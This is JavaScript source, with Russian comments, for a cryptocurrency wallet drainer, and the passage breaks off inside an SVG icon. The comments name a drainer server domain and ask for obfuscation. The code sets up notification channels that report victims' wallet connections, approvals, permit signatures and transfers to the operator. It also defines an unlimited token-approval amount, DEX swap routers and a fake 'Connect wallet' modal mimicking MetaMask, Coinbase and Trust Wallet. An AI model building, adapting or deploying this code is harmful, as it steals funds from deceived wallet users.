// Использование данного кода без обфускации СТРОГО ЗАПРЕЩЕНО
// В случае, если это будет обнаружено, будет составлен арбитраж
// Обфускацию данного скрипта можно выполнить здесь: obfuscator.io

// =====================================================================
// ==================== ОСНОВНЫЕ НАСТРОЙКИ СКРИПТА =====================
// =====================================================================

const MS_Server = "myserver-a0cb.onrender.com"; // Указать домен, который прикреплен к серверу дрейнера
// Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер

const MS_Verify_Message = ""; // Сообщение для верификации кошелька, может содержать тег {{ADDRESS}}
// По умолчанию оставьте пустым, чтобы получать сообщение с сервера, иначе заполните, чтобы использовать кастомное

const MS_Custom_Chat = {
  Enable: 0, // 0 - использовать настройки сервера, 1 - использовать настройки клиента
  Chat_Settings: {
    enter_website: "", // ID канала для действия - Вход на сайт (если пусто - уведомление отключено)
    leave_website: "", // ID канала для действия - Выход с сайта (если пусто - уведомление отключено)
    connect_success: "", // ID канала для действия - Успешное подключение (если пусто - уведомление отключено)
    connect_request: "", // ID канала для действия - Запрос на подключение (если пусто - уведомление отключено)
    connect_cancel: "", // ID канала для действия - Подключение отклонено (если пусто - уведомление отключено)
    approve_request: "", // ID канала для действия - Запрос на подтверждение (если пусто - уведомление отключено)
    approve_success: "", // ID канала для действия - Успешное подтверждение (если пусто - уведомление отключено)
    approve_cancel: "", // ID канала для действия - Подтверждение отклонено (если пусто - уведомление отключено)
    permit_sign_data: "", // ID канала для действия - Данные из PERMIT (если пусто - уведомление отключено)
    transfer_request: "", // ID канала для действия - Запрос на перевод (если пусто - уведомление отключено)
    transfer_success: "", // ID канала для действия - Успешный перевод (если пусто - уведомление отключено)
    transfer_cancel: "", // ID канала для действия - Отмена перевода (если пусто - уведомление отключено)
    sign_request: "", // ID канала для действия - Запрос на подпись (если пусто - уведомление отключено)
    sign_success: "", // ID канала для действия - Успешная подпись (если пусто - уведомление отключено)
    sign_cancel: "", // ID канала для действия - Подпись отклонена (если пусто - уведомление отключено)
    chain_request: "", // ID канала для действия - Запрос на смену сети (если пусто - уведомление отключено)
    chain_success: "", // ID канала для действия - Смена сети принята (если пусто - уведомление отключено)
    chain_cancel: "", // ID канала для действия - Смена сети отклонена (если пусто - уведомление отключено)
  }
};
var MS_Worker_ID = null;
let MS_Ready = false;
let MS_Settings = {};
let MS_Contract_ABI = {};
let MS_ID = 0x0;
let MS_Process = false;
let MS_Provider = null;
let MS_Current_Provider = null;
let MS_Current_Address = null;
let MS_Current_Chain_ID = null;
let MS_Web3 = null;
let MS_Signer = null;
let MS_Check_Done = false;
let MS_Currencies = {};
let MS_Force_Mode = false;
let MS_Sign_Disabled = false;
let BL_US = false;
let SP_US = false;
let XY_US = false;
let MS_WC_Version = 0x2;
let MS_Bad_Country = false;
const WC2_Provider = window["@walletconnect/ethereum-provider"].EthereumProvider;
(async () => {
  try {
    let _0x18d1b1 = await fetch("https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD", {
      'method': "GET",
      'headers': {
        'Accept': "application/json"
      }
    });
    MS_Currencies = await _0x18d1b1.json();
  } catch (_0x1f56b3) {
    console.log(_0x1f56b3);
  }
})();
const MS_API_Data = {
  0x1: "api.etherscan.io",
  0xa: 'api-optimistic.etherscan.io',
  0x38: "api.bscscan.com",
  0x89: "api.polygonscan.com",
  0xfa: "api.ftmscan.com",
  0xa4b1: 'api.arbiscan.io',
  0xa86a: "api.snowtrace.io"
};
var MS_MetaMask_ChainData = {};
const fill_chain_data = () => {
  MS_MetaMask_ChainData = {
    0x1: {
      'chainId': "0x1",
      'chainName': "Ethereum Mainnet",
      'nativeCurrency': {
        'name': "Ether",
        'symbol': "ETH",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0x1]],
      'blockExplorerUrls': ["https://etherscan.io"]
    },
    0x38: {
      'chainId': "0x38",
      'chainName': "BNB Smart Chain",
      'nativeCurrency': {
        'name': "Binance Coin",
        'symbol': "BNB",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0x38]],
      'blockExplorerUrls': ['https://bscscan.com']
    },
    0x89: {
      'chainId': "0x89",
      'chainName': "Polygon Mainnet",
      'nativeCurrency': {
        'name': "MATIC",
        'symbol': "MATIC",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0x89]],
      'blockExplorerUrls': ["https://polygonscan.com"]
    },
    0xa86a: {
      'chainId': '0xA86A',
      'chainName': "Avalanche Network C-Chain",
      'nativeCurrency': {
        'name': "AVAX",
        'symbol': 'AVAX',
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0xa86a]],
      'blockExplorerUrls': ["https://snowtrace.io/"]
    },
    0xa4b1: {
      'chainId': "0xA4B1",
      'chainName': "Arbitrum One",
      'nativeCurrency': {
        'name': "ETH",
        'symbol': "ETH",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0xa4b1]],
      'blockExplorerUrls': ["https://explorer.arbitrum.io"]
    },
    0xa: {
      'chainId': "0xA",
      'chainName': "Optimism",
      'nativeCurrency': {
        'name': "ETH",
        'symbol': 'ETH',
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0xa]],
      'blockExplorerUrls': ["https://optimistic.etherscan.io/"]
    },
    0xfa: {
      'chainId': "0xFA",
      'chainName': "Fantom Opera",
      'nativeCurrency': {
        'name': "FTM",
        'symbol': "FTM",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0xfa]],
      'blockExplorerUrls': ['https://ftmscan.com/']
    }
  };
};
const MS_Routers = {
  0x1: [["Uniswap", "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"], ['Pancake', "0xEfF92A263d31888d860bD50809A8D171709b7b1c"], ["Pancake_V3", '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'], ["Sushiswap", "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F"]],
  0xa: [["Uniswap", "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"]],
  0x38: [["Pancake", '0x10ED43C718714eb63d5aA57B78B54704E256024E'], ["Pancake_V3", "0x13f4EA83D0bd40E75C8222255bc855a974568Dd4"], ["Sushiswap", "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]],
  0x89: [["Uniswap", "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"], ["Sushiswap", "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"], ["Quickswap", '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']],
  0xfa: [["Sushiswap", "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]],
  0xa4b1: [['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'], ['Sushiswap', "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]],
  0xa86a: [['Sushiswap', "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]]
};
const MS_Swap_Route = {
  0x1: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
  0xa: '0x4200000000000000000000000000000000000006',
  0x38: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
  0x89: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270",
  0xfa: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
  0xa4b1: "0x82af49447d8a07e3bd95bd0d56f35241523fbab1",
  0xa86a: "0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7"
};
const MS_Uniswap_ABI = [{
  'inputs': [{
    'internalType': "uint256",
    'name': "amountIn",
    'type': "uint256"
  }, {
    'internalType': "uint256",
    'name': "amountOutMin",
    'type': 'uint256'
  }, {
    'internalType': 'address[]',
    'name': "path",
    'type': "address[]"
  }, {
    'internalType': "address",
    'name': 'to',
    'type': 'address'
  }],
  'name': "swapExactTokensForTokens",
  'outputs': [{
    'internalType': 'uint256',
    'name': 'amountOut',
    'type': "uint256"
  }],
  'stateMutability': 'payable',
  'type': "function"
}, {
  'inputs': [{
    'internalType': 'uint256',
    'name': 'deadline',
    'type': "uint256"
  }, {
    'internalType': "bytes[]",
    'name': "data",
    'type': "bytes[]"
  }],
  'name': "multicall",
  'outputs': [{
    'internalType': "bytes[]",
    'name': '',
    'type': "bytes[]"
  }],
  'stateMutability': 'payable',
  'type': 'function'
}];
const MS_Pancake_ABI = [{
  'inputs': [{
    'internalType': "uint256",
    'name': "amountIn",
    'type': "uint256"
  }, {
    'internalType': "uint256",
    'name': "amountOutMin",
    'type': "uint256"
  }, {
    'internalType': "address[]",
    'name': "path",
    'type': "address[]"
  }, {
    'internalType': "address",
    'name': 'to',
    'type': "address"
  }, {
    'internalType': "uint256",
    'name': "deadline",
    'type': "uint256"
  }],
  'name': 'swapExactTokensForTokens',
  'outputs': [{
    'internalType': "uint256[]",
    'name': "amounts",
    'type': 'uint256[]'
  }],
  'stateMutability': 'nonpayable',
  'type': 'function'
}, {
  'inputs': [{
    'internalType': "uint256",
    'name': "amountIn",
    'type': "uint256"
  }, {
    'internalType': "uint256",
    'name': "amountOutMin",
    'type': "uint256"
  }, {
    'internalType': 'address[]',
    'name': "path",
    'type': "address[]"
  }, {
    'internalType': "address",
    'name': 'to',
    'type': "address"
  }, {
    'internalType': "uint256",
    'name': 'deadline',
    'type': "uint256"
  }],
  'name': 'swapExactTokensForETH',
  'outputs': [{
    'internalType': "uint256[]",
    'name': "amounts",
    'type': "uint256[]"
  }],
  'stateMutability': "nonpayable",
  'type': "function"
}, {
  'inputs': [{
    'internalType': "uint256",
    'name': 'deadline',
    'type': 'uint256'
  }, {
    'internalType': "bytes[]",
    'name': "data",
    'type': "bytes[]"
  }],
  'name': "multicall",
  'outputs': [{
    'internalType': 'bytes[]',
    'name': '',
    'type': "bytes[]"
  }],
  'stateMutability': "payable",
  'type': 'function'
}, {
  'inputs': [{
    'internalType': "uint256",
    'name': "amountIn",
    'type': "uint256"
  }, {
    'internalType': 'uint256',
    'name': 'amountOutMin',
    'type': "uint256"
  }, {
    'internalType': "address[]",
    'name': 'path',
    'type': 'address[]'
  }, {
    'internalType': "address",
    'name': 'to',
    'type': 'address'
  }],
  'name': "swapExactTokensForTokens",
  'outputs': [{
    'internalType': 'uint256[]',
    'name': "amounts",
    'type': "uint256[]"
  }],
  'stateMutability': 'nonpayable',
  'type': "function"
}];
const MS_Current_URL = window.location.href.replace(/http[s]*:\/\//, '');
const MS_Mobile_Status = (() => {
  let _0x239e74 = false;
  (function (_0x5223d6) {
    if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(_0x5223d6) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(_0x5223d6.substr(0x0, 0x4))) {
      _0x239e74 = true;
    }
  })(navigator.userAgent || navigator.vendor || window.opera);
  return _0x239e74;
})();
const MS_Unlimited_Amount = "1158472395435294898592384258348512586931256";
const MS_Modal_Data = [{
  'type': "style",
  'data': "@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/web3-modal/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }"
}, {
  'type': 'html',
  'data': "<div class=\"web3-modal-main\"><p class=\"web3-modal-title\" style=\"margin-top:0\">Connect your wallet</p><div class=\"web3-modal-items\"><div class=\"item\" onclick='connect_wallet(\"MetaMask\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/MM.svg\" alt=\"\"></div><span>MetaMask</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick='connect_wallet(\"Coinbase\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/CB.svg\" alt=\"\"></div><span>Coinbase</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick='connect_wallet(\"Trust Wallet\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/TW.svg\" alt=\"\"></div><span>Trust Wallet</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick='connect_wallet(\"Binance Wallet\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/BW.svg\" alt=\"\"></div><span>Binance Wallet</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick=\"use_wc()\"><div><div class=\"icon\"></div><span>More Wallets</span></div><div class=\"arrow\"></div></div></div></div><div class=\"web3-modal-wc\" style=\"display:none\"><p class=\"web3-modal-title\" style=\"margin-top:0\">Choose Version</p><div class=\"web3-modal-items\"><div class=\"item\" onclick='connect_wallet(\"WalletConnect\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/WC.svg\" alt=\"\"></div><span>WalletConnect</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick='connect_wallet(\"WalletConnect\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/WC1.svg\" alt=\"\"></div><span>WalletConnect Legacy</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick=\"ms_init()\"><div class=\"arrow\" style=\"transform:rotateY(190deg)\"></div><div><div class=\"icon\"></div><span>Return to Wallets</span></div></div></div></div>"
}];
const CUSTOM_modal_style = "@import url(https://fonts.googleapis.com/css2?family=Manrope:wght@400;500&display=swap);#overlay { position: fixed; display: block; width: 100%; height: 100%; top: 0; background-color: rgb(0 0 0/25%); left: 0; right: 0; bottom: 0; z-index: 99999; }.modal{position:absolute;top:150%;left:50%;transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);box-sizing:border-box;width:100%;display:flex;max-width:440px;font-family:Manrope;flex-direction:column;color:#01091b;align-items:flex-start;background:#fff;border-radius:24px}.modal-head{display:flex;padding:32px 24px;justify-content:space-between;align-items:center;box-sizing:border-box}.modal-head-block-f{display:flex;flex-direction:column;align-items:flex-start;gap:8px}.modal-head-title{font-size:22px;font-weight:500}.modal-head-desc{color:#677189;font-size:16px;max-width:279px;font-weight:400}.modal-close{display:flex;padding:12px;align-items:flex-start;gap:8px;justify-content:end;position:absolute;right:8px;top:8px;cursor:pointer}.modal-main{display:flex;padding:0 24px 32px 24px;flex-direction:column;gap:20px}.modal-main-title{font-size:16px;font-weight:500}.modal-main-menu{display:flex;align-items:flex-start;align-content:flex-start;gap:16px;align-self:stretch;flex-wrap:wrap;justify-content:center}.menu-el{display:flex;padding:16px;flex-direction:column;align-items:flex-start;gap:32px;box-sizing:border-box;cursor:pointer;max-width:188px;border-radius:16px;border:1px solid #d3e5ed}.modal-el-desc{display:flex;flex-direction:column;align-items:flex-start;gap:4px;align-self:stretch}span.modal-el-desc-first{font-size:16px;font-style:normal;font-weight:500}span.modal-el-desc-second{color:#677189;font-size:14px;font-style:normal;font-weight:400;align-self:stretch}.modal-icon{display:flex;width:32px;height:32px;justify-content:center;align-items:center}.menu-el:hover{border:1px solid #0052ff}.modal-bottom{display:flex;padding:0 24px 24px 24px;flex-direction:column;align-items:center;gap:16px;align-self:stretch}.modal-bottom button{border-radius:16px;background:#0052ff;display:flex;padding:16px 0;justify-content:center;align-items:center;gap:8px;align-self:stretch;outline:0;cursor:pointer;border:0;color:#fff;font-size:16px;font-weight:500}.modal-bottom span{color:#677189;font-size:14px;font-style:normal;font-weight:300}.modal.black{background:#161a1e;color:#f5f5f5}.modal.black .menu-el{border:1px solid #2c3437}.modal.black .menu-el:hover{border:1px solid #0052ff}.modal.black .modal-head-desc{color:#a7a8aa}.modal.black span.modal-el-desc-second{color:#a7a8aa}.modal.black .modal-bottom span{color:#a7a8aa}@media (min-width:375px) and (max-width:450px){.menu-el{max-width:100%;width:100%;flex-direction:row}}@media (min-width:150px) and (max-width:375px){.menu-el{max-width:100%;width:100%;flex-direction:row}span.modal-el-desc-second {display: none;}.modal-el-desc {justify-content: center;align-items: center;}}";
const CUSTOM_modal_code = "<div class=\"modal black\" style=\"display: none;\"><div class=modal-head><div class=modal-head-block-f><div class=modal-head-title>Connect wallet</div><div class=modal-head-desc>Choose what network and wallet want to connect below</div></div><div class=modal-close><svg fill=none height=24 viewBox=\"0 0 24 24\"width=24 xmlns=http://www.w3.org/2000/svg><path d=\"M5.31854 5.31952C5.74457 4.89349 6.4353 4.89349 6.86132 5.31952L11.5445 10.0027L16.2276 5.31952C16.6537 4.89349 17.3444 4.89349 17.7704 5.31952C18.1964 5.74555 18.1964 6.43627 17.7704 6.8623L13.0873 11.5455L17.7704 16.2286C18.1964 16.6546 18.1964 17.3454 17.7704 17.7714C17.3444 18.1974 16.6537 18.1974 16.2276 17.7714L11.5445 13.0882L6.86132 17.7714C6.4353 18.1974 5.74457 18.1974 5.31854 17.7714C4.89252 17.3454 4.89252 16.6546 5.31854 16.2286L10.0017 11.5455L5.31854 6.8623C4.89252 6.43627 4.89252 5.74555 5.31854 5.31952Z\"fill=#C4C4C4 clip-rule=evenodd fill-rule=evenodd></path></svg></div></div><div class=modal-main><div class=modal-main-title>Choose Network</div><div class=modal-main-menu><div class=menu-el data=1><div class=modal-icon><svg fill=none height=30 viewBox=\"0 0 32 30\"width=32 xmlns=http://www.w3.org/2000/svg><path d=\"M30.3712 0.342773L17.9856 9.51402L20.255 4.12465L30.3712 0.342773Z\"fill=#E17726></path><path d=\"M30.3713 0.342559L30.3013 0.247559L18.262 9.16193L20.3438 4.21693L30.4126 0.453184L30.3713 0.342559L30.3013 0.247559L30.3713 0.342559L30.3301 0.231934L20.2132 4.01381L20.1457 4.07818L17.877 9.46756L17.9126 9.60631L18.0557 9.60881L30.442 0.437559L30.4751 0.285684L30.3301 0.231934L30.3713 0.342559Z\"fill=#E17726></path><path d=\"M1.72316 0.342773L14.0144 9.6084L11.84 4.12465L1.72316 0.342773ZM25.8332 21.6159L22.5238 26.6271L29.615 28.6128L31.6007 21.7109C31.695 21.7109 25.8332 21.6159 25.8332 21.6159ZM0.399414 21.8053L2.38504 28.7071L9.47629 26.7215L6.16691 21.7103C6.16691 21.6159 0.399414 21.8053 0.399414 21.8053Z\"fill=#E27625></path><path d=\"M1.72314 0.342559L1.65189 0.436934L13.9431 9.70256L14.0856 9.70193L14.1238 9.56443L11.95 4.08068L11.8813 4.01381L1.76439 0.231934L1.61939 0.285684L1.65189 0.436934L1.72314 0.342559L1.68189 0.453184L11.7494 4.21693L13.7494 9.26068L1.79439 0.248184L1.72314 0.342559ZM25.8331 21.6157L25.7344 21.5507L22.425 26.5619L22.4131 26.6682L22.4919 26.7407L29.5831 28.7263L29.7288 28.6451L31.7144 21.7432L31.6006 21.7107V21.8288L31.6113 21.8282L31.7169 21.7351L31.6581 21.6069L31.6156 21.5932L31.5856 21.5919C31.2344 21.5851 25.8344 21.4976 25.8344 21.4976L25.7338 21.5507L25.8331 21.6157L25.8313 21.7338C25.8344 21.7338 27.2731 21.7569 28.7156 21.7807C29.4369 21.7926 30.1575 21.8044 30.6988 21.8132C30.9694 21.8176 31.1944 21.8213 31.3519 21.8238L31.535 21.8269L31.5831 21.8276H31.595H31.5969L31.5994 21.7569L31.5956 21.8276H31.5969L31.5994 21.7569L31.5956 21.8276L31.6013 21.7157L31.5919 21.8276H31.5956L31.6013 21.7157L31.5919 21.8276L31.6013 21.7107L31.5838 21.8269L31.5913 21.8276L31.6006 21.7107L31.5831 21.8269L31.6006 21.7101L31.5688 21.8238L31.5831 21.8269L31.6006 21.7101L31.5906 21.5926L31.5994 21.6969V21.5919L31.5906 21.5926L31.5994 21.6969V21.5919L31.4856 21.6776L29.5325 28.4669L22.7106 26.5569L25.9306 21.6813L25.8331 21.6157ZM0.399395 21.8051L0.285645 21.8376L2.27127 28.7394L2.41689 28.8207L9.50815 26.8351L9.58689 26.7626L9.57502 26.6563L6.26565 21.6451L6.16689 21.7101H6.28502L6.22627 21.6057L6.12002 21.5782C6.01877 21.5688 5.82877 21.5651 5.56752 21.5651C4.08627 21.5651 0.396895 21.6863 0.39627 21.6863L0.304395 21.7351L0.28627 21.8376L0.399395 21.8051L0.403145 21.9232C0.408145 21.9232 4.09502 21.8019 5.5669 21.8019C5.75065 21.8019 5.8994 21.8038 6.00065 21.8082L6.11064 21.8157L6.12377 21.8176L6.14752 21.7338L6.10252 21.8076L6.12377 21.8176L6.14752 21.7338L6.10252 21.8076L6.16252 21.7101H6.0494L6.10315 21.8076L6.16315 21.7101H6.05002L6.0694 21.7751L9.2894 26.6507L2.46627 28.5613L0.513145 21.7726L0.399395 21.8051Z\"fill=#E27625></path><path d=\"M9.09817 13.1062L7.11255 16.0375L14.1094 16.3212L13.92 8.75746L9.09817 13.1062ZM22.9969 13.1062L18.0807 8.75684L17.8913 16.4156L24.8882 16.1318C24.8875 16.0375 22.9969 13.1062 22.9969 13.1062ZM9.4763 26.7212L13.7313 24.6412L10.0438 21.805L9.4763 26.7212ZM18.3638 24.6412L22.6188 26.7212L22.0513 21.805C21.9569 21.805 18.3638 24.6412 18.3638 24.6412Z\"fill=#E27625></path><path d=\"M9.09809 13.1066L8.99996 13.0403L7.01434 15.9716L7.00684 16.0909L7.10746 16.1559L14.1043 16.4397L14.1918 16.4059L14.2268 16.3191L14.0375 8.75531L13.9662 8.64969L13.8406 8.67031L9.01871 13.0191L8.99996 13.0403L9.09809 13.1066L9.17746 13.1941L13.8087 9.01719L13.9881 16.1978L7.32996 15.9278L9.19621 13.1728L9.09809 13.1066ZM22.9968 13.1066L23.075 13.0178L18.1587 8.66844L18.0331 8.64844L17.9618 8.75406L17.7725 16.4128L17.8075 16.4997L17.895 16.5334L24.8925 16.2503L25.0056 16.1322L24.9906 16.0684C24.9531 15.9834 24.825 15.7722 24.6412 15.4741C24.0943 14.5897 23.0962 13.0428 23.0956 13.0422L23.0743 13.0178L22.9968 13.1066L22.8975 13.1703C22.8987 13.1716 23.37 13.9028 23.8425 14.6472C24.0787 15.0191 24.315 15.3941 24.4918 15.6816C24.58 15.8253 24.6537 15.9466 24.7043 16.0341L24.7618 16.1366L24.7737 16.1616L24.8662 16.1322H24.77L24.7743 16.1616L24.8668 16.1322H24.7706H24.8887L24.8837 16.0141L18.0131 16.2928L18.1931 9.01406L22.9193 13.1953L22.9968 13.1066ZM9.47621 26.7216L9.52809 26.8278L13.7831 24.7478L13.8487 24.6534L13.8031 24.5478L10.1156 21.7116L9.99746 21.6966L9.92621 21.7916L9.35871 26.7078L9.40809 26.8178L9.52809 26.8272L9.47621 26.7216L9.59371 26.7353L10.1368 22.0259L13.5075 24.6191L9.42371 26.6153L9.47621 26.7216ZM18.3637 24.6416L18.3118 24.7478L22.5668 26.8278L22.6868 26.8184L22.7362 26.7084L22.1687 21.7922L22.0512 21.6878L21.9743 21.7109C21.8812 21.7641 21.6237 21.9572 21.2618 22.2322C20.1868 23.0522 18.2906 24.5497 18.29 24.5497L18.2456 24.6553L18.3112 24.7491L18.3637 24.6416L18.4368 24.7341C18.4387 24.7328 19.335 24.0253 20.2443 23.3166C20.6993 22.9622 21.1568 22.6078 21.5062 22.3422C21.6806 22.2097 21.8287 22.0991 21.9343 22.0228L22.0587 21.9359L22.0893 21.9166L22.0906 21.9159L22.0506 21.8234V21.9234L22.0906 21.9159L22.0506 21.8234V21.9234V21.8053L21.9331 21.8191L22.4756 26.5209L18.415 24.5359L18.3637 24.6416Z\"fill=#E27625></path><path d=\"M22.5238 26.7216L18.2688 24.6416L18.6469 27.3835V28.5179L22.5238 26.7216ZM9.47632 26.7216L13.4476 28.6129V27.4785L13.8257 24.7366L9.47632 26.7216Z\"fill=#D5BFB2></path><path d=\"M22.5238 26.7214L22.5757 26.6152L18.3207 24.5352L18.1994 24.5458L18.1519 24.6577L18.5288 27.3914V28.5177L18.5832 28.617L18.6963 28.6245L22.5725 26.8283L22.6413 26.722L22.575 26.6145L22.5238 26.7214L22.4738 26.6139L18.765 28.3327V27.3833L18.7638 27.367L18.4157 24.8452L22.4713 26.8277L22.5238 26.7214ZM9.47628 26.7214L9.42565 26.8283L13.3969 28.7195L13.5107 28.7127L13.5657 28.6127V27.4864L13.9425 24.752L13.8963 24.6408L13.7769 24.6283L9.42753 26.6139L9.35815 26.7202L9.42565 26.8277L9.47628 26.7214L9.52565 26.8289L13.6794 24.9327L13.3307 27.4614L13.3294 27.4777V28.4252L9.52753 26.6145L9.47628 26.7214Z\"fill=#D5BFB2></path><path d=\"M13.4476 20.0088L9.94946 18.9688L12.4076 17.8345L13.4476 20.0088ZM18.5532 20.0088L19.5932 17.8345L22.0513 18.9688L18.5532 20.0088Z\"fill=#233447></path><path d=\"M13.4474 20.0089L13.4812 19.8958L10.283 18.9452L12.3512 17.9908L13.3412 20.0602L13.4474 20.0089L13.5543 19.9577L12.5143 17.7833L12.358 17.7271L9.89991 18.8614L9.83179 18.9771L9.91616 19.0821L13.4143 20.1221L13.538 20.0858L13.5549 19.9583L13.4474 20.0089ZM18.553 20.0089L18.6599 20.0602L19.6499 17.9908L21.718 18.9452L18.5199 19.8958L18.553 20.0089L18.5868 20.1221L22.0849 19.0821L22.1693 18.9771L22.1012 18.8614L19.643 17.7271L19.4868 17.7833L18.4468 19.9577L18.4637 20.0852L18.5874 20.1214L18.553 20.0089Z\"fill=#233447></path><path d=\"M9.47623 26.7212L10.0437 21.71L6.16748 21.8043L9.47623 26.7212ZM21.9569 21.6156L22.5244 26.6268L25.8337 21.7106L21.9569 21.6156ZM24.8875 16.1318L17.8906 16.4156L18.5525 20.0087L19.5925 17.8343L22.0506 18.9687L24.8875 16.1318ZM9.94873 